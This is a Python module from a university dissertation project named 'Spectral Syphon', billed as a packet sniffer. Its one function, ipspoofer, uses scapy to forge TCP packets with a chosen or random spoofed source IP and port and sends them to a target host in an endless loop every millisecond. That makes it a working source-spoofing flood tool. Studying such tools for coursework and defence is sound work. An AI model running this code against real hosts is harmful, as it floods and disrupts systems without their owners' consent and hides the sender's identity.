###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################


from scapy.all import *
import sys
import os
import random
from colorama import Fore, Back, Style


def ipspoofer(source_ip, source_port, target_ip, target_port):
    # If user is not root or sudo, exit
    if not "SUDO_UID" in os.environ.keys():
        print(
            f"{Fore.RED}[!!!] You need to be root or sudo to run this script!{Style.RESET_ALL}"
        )
        sys.exit()

    try:
        if source_ip.lower() == "r":
            src_ip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        else:
            src_ip = f"{source_ip}"

        if source_port.lower() == "r":
            src_port = RandShort()
        else:
            src_port = int(source_port)

        tgt_ip = target_ip
        tgt_port = int(target_port)

        choice = input(
            f"{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Source IP: {src_ip}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Source port: {src_port}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target IP: {tgt_ip}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target port: {tgt_port}{Style.RESET_ALL}\n{Fore.YELLOW}Do you wish to continue? [Y/N]: {Style.RESET_ALL}"
        )

        if choice.lower() == "y":
            IP1 = IP(src=src_ip, dst=tgt_ip)
            TCP1 = TCP(sport=src_port, dport=tgt_port)
            pkt = IP1 / TCP1

            print(
                f"{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Sending packets to IP {Style.RESET_ALL}{Fore.CYAN}{target_ip}{Style.RESET_ALL}{Fore.YELLOW} on port {Style.RESET_ALL}{Fore.CYAN}{target_port}{Style.RESET_ALL}{Fore.YELLOW}...{Style.RESET_ALL}"
            )

            send(pkt, loop=1, inter=0.001, verbose=0)

        else:
            print("Process aborted. Exiting...")
            sys.exit("\n")

    except KeyboardInterrupt:
        print("Process aborted. Exiting...")
        sys.exit("\n")

    except Exception as e:
        e = sys.exc_info()[1]
        print(f"{Fore.RED}[!!!] An error has occured: {e}{Style.RESET_ALL}")
